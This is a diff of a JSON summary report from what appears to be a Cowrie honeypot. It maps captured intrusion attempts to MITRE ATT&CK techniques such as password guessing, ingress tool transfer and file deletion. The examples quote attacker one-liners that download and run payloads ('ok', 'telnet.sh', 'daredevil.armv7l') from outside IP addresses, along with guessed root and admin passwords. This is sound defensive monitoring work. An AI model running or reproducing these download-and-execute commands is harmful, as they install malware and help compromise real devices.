@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-25 01:01:44",
+  "generated": "2026-08-25 02:03:56",
   "totals": {
-    "commands": 10,
-    "login_failed": 66,
-    "login_success": 3,
-    "sessions": 125
+    "commands": 36,
+    "login_failed": 126,
+    "login_success": 11,
+    "sessions": 276
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 66,
+      "count": 126,
       "examples": [
         "root / 12345678",
         "root / 123456789",
@@ -21,22 +21,93 @@
         "root / Password1"
       ],
       "first": "2026-08-25T00:00:38.643564Z",
-      "last": "2026-08-25T01:00:15.132290Z",
-      "unique_ips": 10
+      "last": "2026-08-25T01:57:48.310811Z",
+      "unique_ips": 15
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 45,
+      "examples": [
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "http://5.182.210.174/ok",
+        "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
+        "http://176.65.139.202:80/telnet.sh"
+      ],
+      "first": "2026-08-25T01:41:49.523664Z",
+      "last": "2026-08-25T01:56:40.579144Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 19,
+      "examples": [
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "wget http://176.65.139.202:80/telnet.sh -O /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh",
+        "#!/bin/sh\ncd /tmp || cd /var || cd /dev/shm || cd /\n\nrm -f daredevil.*\n\nwget http://176.65.139.202/daredevil.armv7l || c",
+        "curl http://176.65.139.202:80/telnet.sh -o /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh"
+      ],
+      "first": "2026-08-25T01:41:49.523664Z",
+      "last": "2026-08-25T01:56:40.360395Z",
+      "unique_ips": 2
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 3,
+      "count": 11,
       "examples": [
         "root / root",
         "root / neworangetech",
-        "root / /*6.=_ja"
+        "root / /*6.=_ja",
+        "nobody / nobody",
+        "admin / 1234"
       ],
       "first": "2026-08-25T00:17:08.525783Z",
-      "last": "2026-08-25T00:36:18.669607Z",
-      "unique_ips": 3
+      "last": "2026-08-25T01:56:36.618345Z",
+      "unique_ips": 6
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 6,
+      "examples": [
+        "uname -m"
+      ],
+      "first": "2026-08-25T01:53:08.258780Z",
+      "last": "2026-08-25T01:56:36.705421Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 2,
+      "examples": [
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-25T01:41:49.523664Z",
+      "last": "2026-08-25T01:41:49.659882Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-25T01:41:49.659882Z",
+      "last": "2026-08-25T01:41:49.659882Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
@@ -74,6 +145,10 @@
     ],
     [
       "cd /proc && cat self/cmdline",
+      1
+    ],
+    [
+      "exit",
       1
     ]
   ]
